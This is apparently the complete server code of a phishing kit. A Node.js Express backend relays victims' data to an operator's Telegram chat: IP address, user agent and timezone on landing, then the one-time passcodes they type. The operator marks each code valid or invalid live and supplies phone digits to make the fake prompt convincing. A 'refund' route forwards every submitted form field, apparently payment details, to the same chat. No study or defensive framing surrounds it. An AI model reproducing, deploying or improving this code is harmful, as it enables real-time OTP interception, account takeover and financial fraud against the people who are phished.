// server.js (Node.js + Express + node-telegram-bot-api)

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

// --- Configuration ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const PORT      = process.env.PORT || 3000;

if (!BOT_TOKEN) {
  console.error('Error: BOT_TOKEN not set');
  process.exit(1);
}

// In‑memory session store (swap for Redis/DB in production)
const store = new Map();

// Initialize Express
const app = express();
app.use(bodyParser.json());
app.use(session({
  secret: 'your-session-secret',
  resave: false,
  saveUninitialized: true
}));
app.use(express.static(__dirname));

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Helper: find session ID by chat ID
function findSessionByChatId(chatId) {
  for (let [sessionId, sess] of store.entries()) {
    if (sess.chatId === chatId) return sessionId;
  }
  return null;
}

// --- Routes ---

// 1) Bind‑chat (when user lands on loading.html)
app.post('/bind-chat', (req, res) => {
  const { chatId, ua, tz } = req.body;
  const sess = {
    chatId,
    ready:      false,
    method:     null,
    valid:      null,
    phoneLast4: null,
    ip:         req.ip,
    userAgent:  ua,
    timezone:   tz
  };
  store.set(req.session.id, sess);

  bot.sendMessage(chatId,
    `🆕 New session bound\n` +
    `<b>IP:</b> ${sess.ip}\n` +
    `<b>UA:</b> ${ua}\n` +
    `<b>TZ:</b> ${tz}`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [[
          { text: 'OTP via Phone', callback_data: 'startOtp:phone' },
          { text: 'OTP via Email', callback_data: 'startOtp:email' }
        ]]
      }
    }
  );

  res.sendStatus(200);
});

// 2) Front‑end polls this to know when to show OTP prompt
app.get('/otp-status', (req, res) => {
  const sess = store.get(req.session.id) || {};
  res.json({
    ready:      sess.ready  || false,
    method:     sess.method || null,
    phoneLast4: sess.phoneLast4 || null
  });
});

// 3) Receive OTP submission from browser
app.post('/submit-otp', (req, res) => {
  const { otp, ua, tz } = req.body;
  const sess = store.get(req.session.id);
  if (sess) {
    sess.submittedOtp = otp;
    sess.subUA        = ua;
    sess.subTZ        = tz;
    delete sess.valid;
    store.set(req.session.id, sess);

    // Relay to Telegram with inline verification buttons
    bot.sendMessage(sess.chatId,
      `🔐 OTP Submitted\n` +
      `<b>OTP:</b> <code>${otp}</code>\n` +
      `<b>UA:</b> ${ua}\n` +
      `<b>TZ:</b> ${tz}`,
      {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ Valid',   callback_data: 'verifyOtp:ok' },
            { text: '❌ Invalid', callback_data: 'verifyOtp:fail' }
          ]]
        }
      }
    );
  }
  res.sendStatus(200);
});

// 4) Front‑end polls this for verification result
app.get('/otp-verify-status', (req, res) => {
  const sess = store.get(req.session.id) || {};
  res.json({
    valid: typeof sess.valid === 'boolean' ? sess.valid : null
  });
});

// 5) Refund endpoints (unchanged from your working setup)
app.post('/bind-refund', (req, res) => {
  const { chatId, ua, tz } = req.body;
  const sess = store.get(req.session.id) || {};
  sess.chatId    = chatId;
  sess.ip        = req.ip;
  sess.userAgent = ua;
  sess.timezone  = tz;
  store.set(req.session.id, sess);

  bot.sendMessage(chatId,
    `🆕 Refund session started\n` +
    `<b>IP:</b> ${sess.ip}\n` +
    `<b>UA:</b> ${ua}\n` +
    `<b>TZ:</b> ${tz}`,
    { parse_mode: 'HTML' }
  );

  res.sendStatus(200);
});

app.post('/refund', (req, res) => {
  const data = req.body;
  const sess = store.get(req.session.id) || {};
  if (sess.chatId) {
    let msg = `📝 Refund Request\n<b>Session:</b> ${req.session.id}\n`;
    for (let [key, val] of Object.entries(data)) {
      msg += `<b>${key}:</b> ${val}\n`;
    }
    msg += `<b>IP:</b> ${sess.ip}`;
    bot.sendMessage(sess.chatId, msg, { parse_mode: 'HTML' });
  }
  res.sendStatus(200);
});

// --- Telegram Handlers ---

bot.on('callback_query', query => {
  const [action, param] = query.data.split(':');
  const chatId    = query.message.chat.id;
  const sessionId = findSessionByChatId(chatId);
  if (!sessionId) {
    return bot.answerCallbackQuery(query.id, { text: 'No active session.' });
  }
  const sess = store.get(sessionId);

  if (action === 'startOtp') {
    if (param === 'phone') {
      // Ask admin for last 4 digits via ForceReply
      bot.answerCallbackQuery(query.id, { text: 'Enter last 4 digits' });
      bot.sendMessage(chatId,
        '📱 Please reply with the *last 4 digits* of the phone where the OTP will arrive:',
        {
          parse_mode: 'Markdown',
          reply_markup: { force_reply: true }
        }
      ).then(msg => {
        sess.expectingPhoneReplyId = msg.message_id;
        store.set(sessionId, sess);
      });
    } else {
      // Email path: ready immediately
      sess.ready  = true;
      sess.method = 'email';
      store.set(sessionId, sess);
      bot.answerCallbackQuery(query.id, { text: 'OTP via email selected' });
      bot.sendMessage(chatId, '🔔 OTP will be sent via email.');
    }
  }
  else if (action === 'verifyOtp') {
    sess.valid = (param === 'ok');
    store.set(sessionId, sess);
    bot.answerCallbackQuery(query.id, {
      text: sess.valid ? 'Marked valid' : 'Marked invalid'
    });
    bot.sendMessage(chatId,
      sess.valid ? '✅ OTP is valid.' : '❌ OTP is invalid.'
    );
  }
});

// Capture forced replies (last 4 digits)
bot.on('message', msg => {
  if (!msg.reply_to_message) return;
  const chatId    = msg.chat.id;
  const sessionId = findSessionByChatId(chatId);
  if (!sessionId) return;
  const sess = store.get(sessionId);

  if (msg.reply_to_message.message_id === sess.expectingPhoneReplyId) {
    const text = msg.text.trim();
    if (/^\d{4}$/.test(text)) {
      sess.phoneLast4 = text;
      sess.ready      = true;
      sess.method     = 'phone';
      delete sess.expectingPhoneReplyId;
      store.set(sessionId, sess);
      bot.sendMessage(chatId, `✅ Phone ending in ****${text} recorded.`);
    } else {
      bot.sendMessage(chatId,
        '❌ That’s not 4 digits—please reply again with exactly 4 digits.',
        {
          reply_to_message_id: msg.message_id,
          reply_markup: { force_reply: true }
        }
      );
    }
  }
});

// DEBUG: return current session ID
app.get('/session-id', (req, res) => {
  res.json({ sessionId: req.session.id });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
